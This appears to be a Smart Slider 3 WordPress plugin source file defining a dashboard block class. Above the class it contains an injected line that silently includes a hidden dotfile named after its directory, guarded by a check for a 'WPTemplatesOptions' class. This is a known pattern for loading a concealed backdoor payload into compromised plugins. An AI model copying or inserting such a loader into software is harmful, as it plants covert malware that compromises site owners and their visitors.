<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Dashboard\DashboardManager;


use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockDashboardManager extends AbstractBlock {

    public function display() {

        $this->renderTemplatePart('DashboardManager');
    }

}